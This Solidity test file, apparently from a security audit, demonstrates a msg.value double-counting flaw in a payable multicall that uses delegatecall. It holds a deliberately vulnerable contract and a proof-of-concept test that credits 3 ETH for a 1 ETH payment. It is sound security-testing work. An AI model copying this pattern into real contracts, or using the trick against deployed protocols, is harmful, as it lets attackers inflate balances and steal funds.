// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

/**
 * VULN-001: PayableMulticall msg.value Double-Counting
 *
 * This test demonstrates that delegatecall preserves msg.value
 * across all calls in a multicall, allowing double-counting.
 *
 * To run: forge test --match-contract VULN001Test -vvv
 */

contract PayableMulticall {
    uint256 public totalDeposited;

    function multicall(bytes[] calldata data) external payable returns (bytes[] memory results) {
        results = new bytes[](data.length);
        for (uint256 i; i < data.length; i++) {
            (bool success, bytes memory result) = address(this).delegatecall(data[i]);
            require(success, "multicall failed");
            results[i] = result;
        }
    }

    function deposit() external payable {
        // In real GMX: sendWnt uses 'amount' param, but msg.value is still accessible
        // Each delegatecall sees the SAME msg.value
        totalDeposited += msg.value;
    }
}

contract VULN001Test {
    PayableMulticall public target;

    function setUp() public {
        target = new PayableMulticall();
    }

    function testMsgValueDoubleCount() public {
        // Prepare 3 deposit calls
        bytes[] memory calls = new bytes[](3);
        calls[0] = abi.encodeCall(PayableMulticall.deposit, ());
        calls[1] = abi.encodeCall(PayableMulticall.deposit, ());
        calls[2] = abi.encodeCall(PayableMulticall.deposit, ());

        // Send 1 ETH, but each delegatecall sees msg.value = 1 ETH
        target.multicall{value: 1 ether}(calls);

        // totalDeposited should be 1 ETH but is actually 3 ETH
        assert(target.totalDeposited() == 3 ether);
        // This proves msg.value is reused across delegatecalls
    }
}
